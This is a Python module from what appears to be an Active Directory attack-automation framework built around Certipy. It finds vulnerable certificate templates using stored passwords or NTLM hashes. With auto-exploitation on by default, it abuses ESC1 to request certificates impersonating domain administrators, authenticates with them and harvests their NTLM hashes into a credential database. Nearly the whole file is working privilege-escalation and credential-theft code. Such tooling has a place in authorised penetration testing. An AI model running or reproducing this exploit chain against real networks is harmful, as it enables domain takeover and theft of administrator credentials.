#!/usr/bin/env python3
"""
Certipy Enumeration Module for AD-Automaton
Performs AD CS enumeration and exploitation using Certipy.
"""

import os
import re
import json
import logging
import tempfile
from typing import List, Dict, Any, Optional, Tuple

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, Vulnerability, Host
from executor import CommandExecutor
from parsers import CertipyParser
from logger import log_discovery, log_tool_execution, log_tool_result

class CertipyEnumerator:
    """
    Handles AD CS enumeration and exploitation using Certipy.
    Discovers vulnerable certificate templates and exploits them.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the Certipy enumerator.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = CertipyParser()
        
        # Get tool configurations
        self.certipy_config = config.get('tools', {}).get('certipy', {})
        self.certipy_path = self.certipy_config.get('path', 'certipy')
        
        # Feature flags
        self.enabled = config.get('features', {}).get('enable_adcs', True)
        self.auto_exploit = config.get('features', {}).get('auto_exploit_esc1', True)
        
        # OPSEC settings
        self.opsec_profile = config.get('opsec_profile', 'normal')
        
        # Output directory for certificates
        self.output_dir = config.get('output', {}).get('cert_dir', '/tmp/ad-automaton-certs')
        os.makedirs(self.output_dir, exist_ok=True)
    
    def run_certipy_enumeration(self) -> List[Vulnerability]:
        """
        Main method to run AD CS enumeration and exploitation.
        
        Returns:
            List of discovered vulnerabilities
        """
        if not self.enabled:
            self.logger.info("AD CS enumeration is disabled in configuration")
            return []
        
        self.logger.info("Starting AD CS enumeration with Certipy")
        
        # Get valid domain credentials for enumeration
        valid_credentials = self._get_valid_domain_credentials()
        
        if not valid_credentials:
            self.logger.warning("No valid domain credentials found for AD CS enumeration")
            return []
        
        discovered_vulns = []
        
        # Try enumeration with each valid credential
        for credential in valid_credentials:
            try:
                # Run Certipy find to discover vulnerable templates
                vulns = self._enumerate_vulnerable_templates(credential)
                discovered_vulns.extend(vulns)
                
                # Auto-exploit ESC1 vulnerabilities if enabled
                if self.auto_exploit and vulns:
                    self._auto_exploit_esc1_vulnerabilities(credential, vulns)
                
                if vulns:
                    # If we found vulnerabilities with this credential, continue
                    break
                    
            except Exception as e:
                self.logger.error(f"AD CS enumeration failed with credential {credential.username}: {e}")
                continue
        
        # Store discovered vulnerabilities
        if discovered_vulns:
            self._store_vulnerabilities(discovered_vulns)
        
        log_discovery("AD CS vulnerabilities", len(discovered_vulns))
        
        return discovered_vulns
    
    def _get_valid_domain_credentials(self) -> List[Credential]:
        """Get valid domain credentials from the database."""
        query = """
            SELECT DISTINCT c.* FROM Credentials c
            JOIN Valid_Credentials vc ON c.cred_id = vc.cred_id
            WHERE c.domain IS NOT NULL AND c.domain != ''
            ORDER BY vc.access_level DESC
        """
        
        credentials = []
        rows = self.db_manager.execute_query(query)
        
        for row in rows:
            credential = Credential(
                cred_id=row[0],
                username=row[1],
                domain=row[2],
                password=row[3],
                hash_value=row[4],
                hash_type=row[5],
                source_tool=row[6]
            )
            credentials.append(credential)
        
        return credentials
    
    def _enumerate_vulnerable_templates(self, credential: Credential) -> List[Vulnerability]:
        """
        Enumerate vulnerable certificate templates using Certipy.
        
        Args:
            credential: Valid domain credential to use
            
        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []
        
        # Get domain controllers to target
        domain_controllers = self._get_domain_controllers()
        
        if not domain_controllers:
            self.logger.warning("No domain controllers found for AD CS enumeration")
            return []
        
        # Target the first available DC
        target_dc = domain_controllers[0]
        
        # Construct Certipy find command
        cmd_parts = [
            self.certipy_path,
            'find',
            '-vulnerable',
            '-enabled',
            '-dc-ip', target_dc.ip_address,
            '-target', credential.domain
        ]
        
        # Add authentication
        if credential.password:
            cmd_parts.extend(['-u', credential.username, '-p', credential.password])
        elif credential.hash_value:
            cmd_parts.extend(['-u', credential.username, '-hashes', f':{credential.hash_value}'])
        else:
            self.logger.error("No usable authentication method for credential")
            return []
        
        # Add output file
        output_file = os.path.join(self.output_dir, f"certipy_enum_{credential.username}.json")
        cmd_parts.extend(['-json', '-output', output_file])
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("certipy find", cmd)
            result = self.executor.execute_command(cmd, timeout=300)
            log_tool_result("certipy find", result.returncode == 0)
            
            if result.returncode == 0:
                # Parse the JSON output
                vulnerabilities = self._parse_certipy_output(output_file, target_dc)
            else:
                self.logger.error(f"Certipy enumeration failed: {result.stderr}")
                
        except Exception as e:
            self.logger.error(f"Error running Certipy enumeration: {e}")
        
        return vulnerabilities
    
    def _parse_certipy_output(self, output_file: str, target_dc: Host) -> List[Vulnerability]:
        """
        Parse Certipy JSON output for vulnerabilities.
        
        Args:
            output_file: Path to Certipy JSON output file
            target_dc: Target domain controller
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    data = json.load(f)
                
                # Parse certificate authorities
                cas = data.get('Certificate Authorities', {})
                
                for ca_name, ca_info in cas.items():
                    # Check for vulnerable templates
                    templates = ca_info.get('Templates', {})
                    
                    for template_name, template_info in templates.items():
                        vuln_types = template_info.get('Vulnerabilities', [])
                        
                        for vuln_type in vuln_types:
                            # Create vulnerability record
                            vulnerability = Vulnerability(
                                host_id=target_dc.host_id,
                                vuln_name=f"AD CS {vuln_type}",
                                description=f"Vulnerable certificate template '{template_name}' on CA '{ca_name}' - {vuln_type}",
                                source_tool="certipy"
                            )
                            vulnerabilities.append(vulnerability)
                            
                            self.logger.info(f"Found {vuln_type} vulnerability in template {template_name}")
        
        except Exception as e:
            self.logger.error(f"Error parsing Certipy output: {e}")
        
        return vulnerabilities
    
    def _auto_exploit_esc1_vulnerabilities(self, credential: Credential, vulnerabilities: List[Vulnerability]) -> List[Credential]:
        """
        Automatically exploit ESC1 vulnerabilities to obtain high-privilege certificates.
        
        Args:
            credential: Valid credential to use for exploitation
            vulnerabilities: List of discovered vulnerabilities
            
        Returns:
            List of new high-privilege credentials obtained
        """
        new_credentials = []
        
        # Find ESC1 vulnerabilities
        esc1_vulns = [v for v in vulnerabilities if 'ESC1' in v.vuln_name]
        
        if not esc1_vulns:
            self.logger.info("No ESC1 vulnerabilities found for auto-exploitation")
            return []
        
        self.logger.info(f"Found {len(esc1_vulns)} ESC1 vulnerabilities, attempting auto-exploitation")
        
        # Get domain administrators to impersonate
        domain_admins = self._get_domain_administrators()
        
        for vuln in esc1_vulns:
            for admin_user in domain_admins[:3]:  # Limit to first 3 DAs
                try:
                    new_cred = self._exploit_esc1(credential, vuln, admin_user)
                    if new_cred:
                        new_credentials.append(new_cred)
                        self.logger.info(f"Successfully obtained certificate for {admin_user}")
                        break  # Success, move to next vulnerability
                except Exception as e:
                    self.logger.error(f"ESC1 exploitation failed for {admin_user}: {e}")
                    continue
        
        # Store new credentials
        if new_credentials:
            self._store_credentials(new_credentials)
            log_discovery("ESC1 exploitation credentials", len(new_credentials))
        
        return new_credentials
    
    def _exploit_esc1(self, credential: Credential, vulnerability: Vulnerability, target_user: str) -> Optional[Credential]:
        """
        Exploit a specific ESC1 vulnerability to obtain a certificate for a target user.
        
        Args:
            credential: Valid credential to use
            vulnerability: ESC1 vulnerability to exploit
            target_user: Target user to impersonate
            
        Returns:
            New credential if successful, None otherwise
        """
        # Extract template name from vulnerability description
        template_match = re.search(r"template '([^']+)'", vulnerability.description)
        if not template_match:
            self.logger.error("Could not extract template name from vulnerability")
            return None
        
        template_name = template_match.group(1)
        
        # Get domain controllers
        domain_controllers = self._get_domain_controllers()
        if not domain_controllers:
            return None
        
        target_dc = domain_controllers[0]
        
        # Step 1: Request certificate with arbitrary SAN
        cert_file = os.path.join(self.output_dir, f"esc1_{target_user}.pfx")
        
        req_cmd_parts = [
            self.certipy_path,
            'req',
            '-dc-ip', target_dc.ip_address,
            '-target', credential.domain,
            '-template', template_name,
            '-upn', f"{target_user}@{credential.domain}",
            '-out', cert_file
        ]
        
        # Add authentication
        if credential.password:
            req_cmd_parts.extend(['-u', credential.username, '-p', credential.password])
        elif credential.hash_value:
            req_cmd_parts.extend(['-u', credential.username, '-hashes', f':{credential.hash_value}'])
        
        req_cmd = ' '.join(req_cmd_parts)
        
        try:
            log_tool_execution("certipy req", req_cmd)
            result = self.executor.execute_command(req_cmd, timeout=120)
            
            if result.returncode != 0:
                self.logger.error(f"Certificate request failed: {result.stderr}")
                return None
            
            # Step 2: Authenticate with certificate to get credentials
            auth_cmd_parts = [
                self.certipy_path,
                'auth',
                '-pfx', cert_file,
                '-dc-ip', target_dc.ip_address
            ]
            
            auth_cmd = ' '.join(auth_cmd_parts)
            
            log_tool_execution("certipy auth", auth_cmd)
            auth_result = self.executor.execute_command(auth_cmd, timeout=120)
            log_tool_result("certipy auth", auth_result.returncode == 0)
            
            if auth_result.returncode == 0:
                # Parse credentials from output
                return self._parse_certipy_auth_output(auth_result.stdout, target_user, credential.domain)
            else:
                self.logger.error(f"Certificate authentication failed: {auth_result.stderr}")
                return None
                
        except Exception as e:
            self.logger.error(f"ESC1 exploitation error: {e}")
            return None
    
    def _parse_certipy_auth_output(self, output: str, username: str, domain: str) -> Optional[Credential]:
        """
        Parse Certipy auth output to extract credentials.
        
        Args:
            output: Certipy auth command output
            username: Username the certificate was issued for
            domain: Domain name
            
        Returns:
            Extracted credential if successful
        """
        try:
            # Look for NTLM hash in output
            hash_match = re.search(r'NTLM:\s*([a-f0-9]{32})', output, re.IGNORECASE)
            
            if hash_match:
                ntlm_hash = hash_match.group(1)
                
                return Credential(
                    username=username,
                    domain=domain,
                    hash_value=ntlm_hash,
                    hash_type='NTLM',
                    source_tool='certipy_esc1'
                )
                
        except Exception as e:
            self.logger.error(f"Error parsing Certipy auth output: {e}")
        
        return None
    
    def _get_domain_controllers(self) -> List[Host]:
        """Get domain controllers from the database."""
        query = "SELECT * FROM Hosts WHERE is_dc = 1"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _get_domain_administrators(self) -> List[str]:
        """Get domain administrator usernames from the database."""
        query = """
            SELECT DISTINCT u.username FROM Users u
            JOIN Group_Memberships gm ON u.user_id = gm.user_id
            JOIN Groups g ON gm.group_id = g.group_id
            WHERE g.group_name LIKE '%Domain Admins%' OR g.group_name LIKE '%Administrators%'
            OR u.is_admin = 1
        """
        
        rows = self.db_manager.execute_query(query)
        return [row[0] for row in rows if row[0]]
    
    def _store_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> None:
        """Store discovered vulnerabilities in the database."""
        for vuln in vulnerabilities:
            try:
                self.db_manager.add_vulnerability(vuln)
            except Exception as e:
                self.logger.error(f"Error storing vulnerability: {e}")
    
    def _store_credentials(self, credentials: List[Credential]) -> None:
        """Store new credentials in the database."""
        for cred in credentials:
            try:
                self.db_manager.add_credential(cred)
            except Exception as e:
                self.logger.error(f"Error storing credential: {e}")


def run_certipy_enumeration(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Vulnerability]:
    """
    Main entry point for Certipy enumeration module.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of discovered vulnerabilities
    """
    enumerator = CertipyEnumerator(db_manager, config)
    return enumerator.run_certipy_enumeration() 